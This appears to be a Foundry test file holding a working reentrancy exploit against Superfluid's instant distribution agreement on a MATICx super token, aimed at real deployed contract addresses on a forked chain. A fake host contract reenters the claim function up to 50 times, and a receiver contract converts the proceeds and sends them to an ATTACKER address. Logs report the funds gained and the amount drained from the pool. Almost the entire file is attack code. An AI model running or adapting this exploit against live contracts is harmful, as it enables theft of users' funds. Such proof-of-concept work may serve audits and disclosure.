// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface IIDA {
    function claim(address,address,uint32,address,bytes calldata) external returns (bytes memory);
}
interface IMATICx {
    function balanceOf(address) external view returns (uint256);
    function upgradeByETH() external payable;
    function downgradeToETH(uint256) external;
}
interface ISuperfluid {
    function callAgreement(address,bytes calldata,bytes calldata) external returns (bytes memory);
}

contract DrainHost2 {
    address public ida; address public maticx;
    address public publisher; address public subscriber;
    uint32 public indexId; uint public count; uint public maxCount;
    constructor(address _ida,address _mx){ida=_ida;maticx=_mx;}
    function setTarget(address p,uint32 i,address s,uint m)external{publisher=p;indexId=i;subscriber=s;maxCount=m;}
    function getAppManifest(address)external pure returns(bool,bool,uint256){return(true,false,0);}
    function isApp(address)external pure returns(bool){return true;}
    function isCtxValid(bytes calldata)external pure returns(bool){return true;}
    function decodeCtx(bytes memory)external pure returns(uint8,uint8,uint256,address,bytes4,bytes memory,uint256,uint256,int256,address,address){return(0,1,0,address(0),bytes4(0),"",0,0,0,address(0),address(0));}
    function appCallbackPush(bytes calldata,address,uint256,int256,address)external returns(bytes memory){return"";}
    function appCallbackPop(bytes calldata,int256)external returns(bytes memory){return"";}
    function callAppBeforeCallback(address,bytes calldata,bool,bytes calldata)external returns(bytes memory){
        if(count<maxCount){count++;
            bytes memory ctx=abi.encode(abi.encode(uint256(1<<32),uint256(0),address(0),bytes4(0),bytes("")),abi.encode(uint256(0),int256(0),address(0),address(0)));
            try IIDA(ida).claim(maticx,publisher,indexId,subscriber,ctx){}catch{}
        }
        return"";
    }
    function callAppAfterCallback(address,bytes calldata,bool,bytes calldata ctx)external returns(bytes memory){return ctx;}
    function attack()external{count=0;
        bytes memory ctx=abi.encode(abi.encode(uint256(1<<32),uint256(0),address(0),bytes4(0),bytes("")),abi.encode(uint256(0),int256(0),address(0),address(0)));
        IIDA(ida).claim(maticx,publisher,indexId,subscriber,ctx);
    }
    receive()external payable{}
}

contract Receiver2 {
    function drain(address maticx,address payable to)external{
        uint256 b=IMATICx(maticx).balanceOf(address(this));
        if(b>0){IMATICx(maticx).downgradeToETH(b);to.transfer(address(this).balance);}
    }
    receive()external payable{}
}

contract BigDrainTest is Test {
    address constant HOST=0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA=0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICx=0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant ATTACKER=0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    function setUp()public{vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));}

    function test_bigDrain()public{
        vm.startPrank(ATTACKER);
        Receiver2 recv=new Receiver2();
        DrainHost2 dh=new DrainHost2(IDA,MATICx);
        
        // Upgrade 5 MATIC
        IMATICx(MATICx).upgradeByETH{value:5 ether}();
        
        // Setup index
        ISuperfluid(HOST).callAgreement(IDA,abi.encodeWithSelector(bytes4(keccak256("createIndex(address,uint32,bytes)")),MATICx,uint32(42),new bytes(0)),"");
        ISuperfluid(HOST).callAgreement(IDA,abi.encodeWithSelector(bytes4(keccak256("updateSubscription(address,uint32,address,uint128,bytes)")),MATICx,uint32(42),address(recv),uint128(1),new bytes(0)),"");
        ISuperfluid(HOST).callAgreement(IDA,abi.encodeWithSelector(bytes4(keccak256("updateIndex(address,uint32,uint128,bytes)")),MATICx,uint32(42),uint128(5 ether),new bytes(0)),"");
        vm.stopPrank();
        
        // Reentrancy drain - 50 reentries
        dh.setTarget(ATTACKER,42,address(recv),50);
        
        uint256 nativeBefore=ATTACKER.balance;
        uint256 poolBefore=MATICx.balance;
        
        dh.attack();
        
        // Drain receiver
        recv.drain(MATICx,payable(ATTACKER));
        
        uint256 nativeAfter=ATTACKER.balance;
        console.log("ATTACKER native GAINED:", nativeAfter - nativeBefore);
        console.log("MATICx pool drained:", poolBefore - MATICx.balance);
        console.log("Reentries:", dh.count());
    }
}
